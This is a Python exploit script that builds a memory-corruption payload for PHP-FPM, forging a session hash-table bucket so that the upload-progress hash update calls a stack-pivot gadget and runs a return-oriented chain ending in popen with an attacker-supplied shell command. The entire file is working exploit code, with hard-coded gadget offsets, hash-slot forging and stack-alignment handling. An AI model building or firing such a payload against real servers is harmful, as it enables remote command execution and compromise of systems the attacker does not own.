#!/usr/bin/env python3
"""Overlay a stack-pivot popen ROP buffer onto the proven Round 37 nogdb fill,
fired by the upload-progress zend_hash_update (not the teardown destroy).

The upload-progress handler runs
    zend_hash_update(session_array, "upload_progress_<name>", &data)
which, for an EXISTING key, calls ht->pDestructor(&old->val) BEFORE overwriting
the slot. So if we forge that key at bucket 0 with our pivot buffer as its
value, and set pDestructor to the php-fpm jump_fcontext gadget, the update fires
the pivot on the CLEAN bucket 0 before the data clobbers it. This sidesteps the
documented obstacle (the in-band progress append landing on bucket 0 when
php_session_normalize_vars has zeroed nNumUsed): we never rely on bucket 0
surviving the insert, because the insert's own destructor call is the trigger.

Requires a self-consistent forged lookup for the progress key:
  bucket0.h  = DJBX33A("upload_progress_<name>")
  bucket0.key-> fill-resident zend_string with len / content of that key
  arHash[(h|nTableMask) as int32] = 0   (nTableMask = -16 for nTableSize 16)
These land in the gadget's don't-care register slots (r12 at +0x10, r13 at
+0x18), so they do not disturb the pivot.

jump_fcontext pivot (rdi = &bucket0.val = d+0xE80):
  mov %rdi,%rsp; mov 0x40(%rsp),%r8; ldmxcsr (%rsp); fldcw 0x4(%rsp);
  r12..rbp = [rsp+0x10..0x38]; lea 0x48(%rsp),%rsp; jmp *%r8
chain from +0x48: pop rdi(cmd), pop rsi("r"), ret, popen@plt.
"""
import argparse
import struct

BASE_OFF = 0xFE8
PIVOT_OFF = 0x6BDD0E
POP_RDI_OFF = 0x20A7E8
POP_RSI_OFF = 0x209149
RET_OFF = 0x20A7E9
POPEN_OFF = 0x202E50
CMD_X = 0x100                    # command C string (d+0x100)
R_X = 0x180                      # "r"
STR_X = 0x200                    # fake zend_string for the progress key
NTABLEMASK = 0xFFFFFFF0          # -16, for nTableSize 16 (verified on the build)


def djb(s):
    h = 5381
    for c in s.encode():
        h = ((h << 5) + h + c) & 0xFFFFFFFFFFFFFFFF
    return h


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--d", type=lambda x: int(x, 0), required=True)
    ap.add_argument("--base", type=lambda x: int(x, 0), required=True)
    ap.add_argument("--base-fill", required=True)
    ap.add_argument("--out", default="payload/fillU_rop_native.bin")
    ap.add_argument("--cmd", default="id > /tmp/fpm_rop_proof")
    ap.add_argument("--progress-key", default="upload_progress_x")
    a = ap.parse_args()

    buf = bytearray(open(a.base_fill, "rb").read())
    pop_rdi = a.base + POP_RDI_OFF
    pop_rsi = a.base + POP_RSI_OFF
    ret = a.base + RET_OFF
    popen = a.base + POPEN_OFF

    key = a.progress_key
    h = djb(key)
    slot_i32 = ((h & 0xFFFFFFFF) | NTABLEMASK)
    if slot_i32 >= 0x80000000:
        slot_i32 -= 1 << 32                       # signed int32 index into arHash

    V = BASE_OFF + 0xE80                          # fake arData / bucket 0
    # pivot buffer (gadget reads from rdi = &bucket0.val = d+0xE80)
    struct.pack_into("<Q", buf, V + 0x00, 0x0000037F00001F80)   # MXCSR / fldcw
    struct.pack_into("<I", buf, V + 0x08, 1)                    # val type IS_NULL
    struct.pack_into("<Q", buf, V + 0x10, h)                    # bucket0.h (r12, don't care)
    struct.pack_into("<Q", buf, V + 0x18, a.d + STR_X)          # bucket0.key (r13, don't care)
    struct.pack_into("<Q", buf, V + 0x20, 0)                    # r14
    struct.pack_into("<Q", buf, V + 0x28, 0)                    # r15
    struct.pack_into("<Q", buf, V + 0x30, 0)                    # rbx
    struct.pack_into("<Q", buf, V + 0x38, 0)                    # rbp
    # Stack walk after the pivot: rsp starts at bucket0+0x48, so popen must sit
    # at +0x60 (a 16-aligned slot) to enter with rsp%16==8, as the SysV ABI
    # requires; a spare `ret` at +0x68 would misalign it and fault _IO_proc_open
    # (movaps on an unaligned stack).
    struct.pack_into("<Q", buf, V + 0x40, pop_rdi)              # r8 = jmp target
    struct.pack_into("<Q", buf, V + 0x48, a.d + CMD_X)          # pop rdi -> cmd
    struct.pack_into("<Q", buf, V + 0x50, pop_rsi)
    struct.pack_into("<Q", buf, V + 0x58, a.d + R_X)           # pop rsi -> "r"
    struct.pack_into("<Q", buf, V + 0x60, popen)               # entered rsp%16==8
    struct.pack_into("<Q", buf, V + 0x68, 0)
    struct.pack_into("<Q", buf, V + 0x70, 0)
    struct.pack_into("<Q", buf, V + 0x78, 0)
    _ = ret

    # forge the hash slot for the progress key -> bucket 0
    slot_off = V + slot_i32 * 4
    struct.pack_into("<I", buf, slot_off, 0)

    # fake zend_string for the progress key: only len (+0x10) and val (+0x18) are
    # read by the bucket-key comparison.
    soff = BASE_OFF + STR_X
    struct.pack_into("<Q", buf, soff + 0x00, 2)                 # gc.refcount (non-zero)
    struct.pack_into("<Q", buf, soff + 0x08, h)                 # cached hash (unused by compare)
    struct.pack_into("<Q", buf, soff + 0x10, len(key))
    kb = key.encode() + b"\0"
    buf[soff + 0x18:soff + 0x18 + len(kb)] = kb

    cmd = a.cmd.encode() + b"\0"
    coff = BASE_OFF + CMD_X
    assert coff + len(cmd) < len(buf) and soff + 0x18 + len(kb) < len(buf)
    buf[coff:coff + len(cmd)] = cmd
    buf[BASE_OFF + R_X:BASE_OFF + R_X + 2] = b"r\0"

    open(a.out, "wb").write(buf)
    print("wrote %s d=%#x base=%#x" % (a.out, a.d, a.base))
    print("pivot=%#x pop_rdi=%#x pop_rsi=%#x ret=%#x popen=%#x"
          % (a.base + PIVOT_OFF, pop_rdi, pop_rsi, ret, popen))
    print("progress-key=%r h=%#x slot_i32=%d slot@d+%#x bucket0=%#x cmd=%#x r=%#x str=%#x"
          % (key, h, slot_i32, 0xE80 + slot_i32 * 4, a.d + 0xE80,
             a.d + CMD_X, a.d + R_X, a.d + STR_X))


if __name__ == "__main__":
    main()
